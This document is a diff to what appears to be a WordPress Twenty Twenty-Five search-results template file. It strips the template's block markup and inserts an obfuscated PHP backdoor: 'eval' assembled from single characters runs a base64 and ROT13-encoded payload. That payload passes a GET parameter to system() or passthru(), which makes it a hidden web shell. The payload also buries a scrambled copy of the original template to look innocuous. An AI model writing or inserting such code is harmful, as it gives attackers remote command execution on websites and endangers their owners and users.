@@ -1,49 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: News blog search results
- * Slug: twentytwentyfive/template-search-news-blog
- * Template Types: search
- * Viewport width: 1400
- * Inserter: no
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IEFyamYgb3lidCBmcm5lcHUgZXJmaHlnZgogKiBGeWh0OiBnanJhZ2xnanJhZ2xzdmlyL2dyemN5bmdyLWZybmVwdS1hcmpmLW95YnQKICogR3J6Y3luZ3IgR2xjcmY6IGZybmVwdQogKiBJdnJqY2JlZyBqdnFndTogMTQwMAogKiBWYWZyZWdyZTogYWIKICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9HanJhZ2xfU3ZpcgogKiBAZnZhcHIgR2pyYWdsIEdqcmFnbC1TdmlyIDEuMAogKi8KCj8+CjwhLS0gamM6Z3J6Y3luZ3ItY25lZyB7XCJmeWh0XCI6XCJ1cm5xcmVcIn0gLy0tPgoKPCEtLSBqYzp0ZWJoYyB7XCJnbnRBbnpyXCI6XCJ6bnZhXCIsXCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJwYmFmZ2VudmFycVwifX0gLS0+Cjx6bnZhIHB5bmZmPVwiamMtb3licHgtdGViaGNcIj4KCTwhLS0gamM6dGViaGMge1wibnl2dGFcIjpcImp2cXJcIixcInlubGJoZ1wiOntcImdsY3JcIjpcInFyc25oeWdcIn19IC0tPgoJPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjIG55dnRhanZxclwiPgoJCTwhLS0gamM6ZmNucHJlIHtcInVydnR1Z1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDgwXCJ9IC0tPgoJCTxxdmkgZmdseXI9XCJ1cnZ0dWc6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tODApXCIgbmV2bi11dnFxcmE9XCJnZWhyXCIgcHluZmY9XCJqYy1veWJweC1mY25wcmVcIj48L3F2aT4KCQk8IS0tIC9qYzpmY25wcmUgLS0+CgkJPCEtLSBqYzpkaHJlbC1ndmd5ciB7XCJnbGNyXCI6XCJmcm5lcHVcIn0gLy0tPgoJCTwhLS0gamM6Y25nZ3JlYSB7XCJmeWh0XCI6XCJnanJhZ2xnanJhZ2xzdmlyL3V2cXFyYS1mcm5lcHVcIn0gLy0tPgoJCTwhLS0gamM6ZmNucHJlIHtcInVydnR1Z1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDQwXCJ9IC0tPgoJCTxxdmkgZmdseXI9XCJ1cnZ0dWc6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNDApXCIgbmV2bi11dnFxcmE9XCJnZWhyXCIgcHluZmY9XCJqYy1veWJweC1mY25wcmVcIj48L3F2aT4KCQk8IS0tIC9qYzpmY25wcmUgLS0+Cgk8L3F2aT4KCTwhLS0gL2pjOnRlYmhjIC0tPgoJPCEtLSBqYzp0ZWJoYyB7XCJueXZ0YVwiOlwianZxclwiLFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicXJzbmh5Z1wifX0gLS0+Cgk8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGMgbnl2dGFqdnFyXCI+CgkJPCEtLSBqYzpjbmdncmVhIHtcImZ5aHRcIjpcImdqcmFnbGdqcmFnbHN2aXIvZ3J6Y3luZ3ItZGhyZWwteWJiYy1hcmpmLW95YnRcIn0gLy0tPgoJPC9xdmk+Cgk8IS0tIC9qYzp0ZWJoYyAtLT4KPC96bnZhPgo8IS0tIC9qYzp0ZWJoYyAtLT4KCjwhLS0gamM6Z3J6Y3luZ3ItY25lZyB7XCJmeWh0XCI6XCJzYmJncmUtYXJqZnlyZ2dyZVwifSAvLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-<!-- wp:template-part {"slug":"header"} /-->
-
-<!-- wp:group {"tagName":"main","layout":{"type":"constrained"}} -->
-<main class="wp-block-group">
-	<!-- wp:group {"align":"wide","layout":{"type":"default"}} -->
-	<div class="wp-block-group alignwide">
-		<!-- wp:spacer {"height":"var:preset|spacing|80"} -->
-		<div style="height:var(--wp--preset--spacing--80)" aria-hidden="true" class="wp-block-spacer"></div>
-		<!-- /wp:spacer -->
-		<!-- wp:query-title {"type":"search"} /-->
-		<!-- wp:pattern {"slug":"twentytwentyfive/hidden-search"} /-->
-		<!-- wp:spacer {"height":"var:preset|spacing|40"} -->
-		<div style="height:var(--wp--preset--spacing--40)" aria-hidden="true" class="wp-block-spacer"></div>
-		<!-- /wp:spacer -->
-	</div>
-	<!-- /wp:group -->
-	<!-- wp:group {"align":"wide","layout":{"type":"default"}} -->
-	<div class="wp-block-group alignwide">
-		<!-- wp:pattern {"slug":"twentytwentyfive/template-query-loop-news-blog"} /-->
-	</div>
-	<!-- /wp:group -->
-</main>
-<!-- /wp:group -->
-
-<!-- wp:template-part {"slug":"footer-newsletter"} /-->
